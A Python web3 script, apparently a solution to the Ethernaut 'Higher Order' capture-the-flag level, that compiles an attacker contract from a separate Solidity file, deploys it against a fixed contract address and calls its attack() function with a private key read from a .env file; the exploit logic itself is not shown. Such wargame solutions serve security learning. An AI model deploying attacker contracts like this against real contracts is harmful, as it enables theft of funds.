from web3 import Web3
from solcx import compile_source
from dotenv import dotenv_values

ENV_PATH = "../.env"

dict_output = dotenv_values(ENV_PATH)

RPC_URI = dict_output['WEB3_PROVIDER_URI']

CONTRACT_ADDRESS = '0x4F57F9239eFCBf43e5920f579D03B3849C588396'
LEVEL_ADDRESS = '0x' + dict_output['ETHERNAUT_LEVEL30_ADDRESS']
PRIVATE_KEY = '0x' + dict_output['USER_ADDRESS_PRIVATE_KEY']

web3 = Web3(Web3.HTTPProvider(RPC_URI))

# 연결 확인
if web3.is_connected():
    print("Connected to Network!")
else:
    print("Failed to connect to Network.")
    
PA = web3.eth.account.from_key(PRIVATE_KEY)
USER_ADDRESS = PA.address

with open("./contract/HigherOrderAttack.sol", "r") as f:
    ATTACKER_SRC_DATA = f.read()

COMPILED_SOL = compile_source(ATTACKER_SRC_DATA, optimize=False, output_values=['abi', 'bin'])

contract_id, contract_interface = COMPILED_SOL.popitem()

ATTACKER_BYTECODE = contract_interface['bin']
ATTACKER_ABI = contract_interface['abi']

attacker = web3.eth.contract(abi=ATTACKER_ABI, bytecode=ATTACKER_BYTECODE)

tx_hash = attacker.constructor(CONTRACT_ADDRESS).transact()

print(f"Transaction Hash: {web3.to_hex(tx_hash)}")

receipt = web3.eth.wait_for_transaction_receipt(tx_hash)
print(f"Transaction Receipt: {receipt}\n")

ATTACKER_ADDRESS = receipt.contractAddress

attacker = web3.eth.contract(address=ATTACKER_ADDRESS, abi=ATTACKER_ABI)

data = {
    "from": USER_ADDRESS,
    "gasPrice": web3.to_wei(0.000001, "ether"),
    "nonce": web3.eth.get_transaction_count(USER_ADDRESS),
}

tx = attacker.functions.attack().build_transaction(data)

signed_tx = web3.eth.account.sign_transaction(tx, PRIVATE_KEY)
tx_hash = web3.eth.send_raw_transaction(signed_tx.raw_transaction)

print(f"Transaction Hash: {web3.to_hex(tx_hash)}")

receipt = web3.eth.wait_for_transaction_receipt(tx_hash)
print(f"Transaction Receipt: {receipt}\n")

print("---- ATTACK FINISHED ----")